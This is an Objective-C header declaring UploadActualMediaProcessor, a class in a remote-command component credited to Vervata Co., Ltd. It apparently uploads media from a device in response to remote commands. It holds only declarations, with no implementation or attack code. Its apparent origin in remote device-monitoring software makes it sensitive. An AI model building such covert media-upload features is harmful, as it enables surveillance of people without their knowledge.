/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  UploadActualMediaProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncHTTPProcessor.h"
#import "EventDelivery.h"

@interface UploadActualMediaProcessor:RemoteCmdAsyncHTTPProcessor <DeliveryEventDelegate> {
@private
	NSInteger	mPairingId;
	BOOL		mFileNotFound;
}

@property (nonatomic, assign) NSInteger mPairingId;
@property (nonatomic, assign) BOOL mFileNotFound;

//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
